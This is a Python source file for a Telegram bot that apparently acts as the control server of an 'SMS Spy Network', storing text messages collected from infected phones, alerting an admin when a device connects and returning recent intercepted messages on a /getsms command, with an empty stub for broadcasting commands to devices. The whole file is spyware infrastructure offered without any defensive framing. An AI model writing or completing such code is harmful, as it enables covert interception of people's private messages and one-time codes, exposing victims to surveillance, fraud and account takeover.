import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import json
import logging
import sqlite3
from threading import Thread

# Configuration
with open('config.json') as f:
    config = json.load(f)

BOT_TOKEN = config['bot_token']
ADMIN_CHAT_ID = config['admin_chat_id']

bot = telegram.Bot(token=BOT_TOKEN)
updater = Updater(token=BOT_TOKEN, use_context=True)

# Database for storing collected SMS
conn = sqlite3.connect('sms_data.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS sms_data
             (phone_id text, sender text, message text, timestamp text)''')
conn.commit()

def start_command(update, context):
    update.message.reply_text("🕵️ SMS Spy Network - Online")
    context.bot.send_message(chat_id=ADMIN_CHAT_ID, text="✅ New device connected")

def get_recent_sms(update, context):
    c.execute("SELECT * FROM sms_data ORDER BY timestamp DESC LIMIT 10")
    messages = c.fetchall()
    for msg in messages:
        update.message.reply_text(f"From: {msg[1]}\nMessage: {msg[2]}\nTime: {msg[3]}")

def broadcast_command(update, context):
    if update.message.chat_id == ADMIN_CHAT_ID:
        # Send command to all connected devices
        pass

# Setup handlers
updater.dispatcher.add_handler(CommandHandler('start', start_command))
updater.dispatcher.add_handler(CommandHandler('getsms', get_recent_sms))
updater.dispatcher.add_handler(CommandHandler('broadcast', broadcast_command))

def start_bot():
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    start_bot()
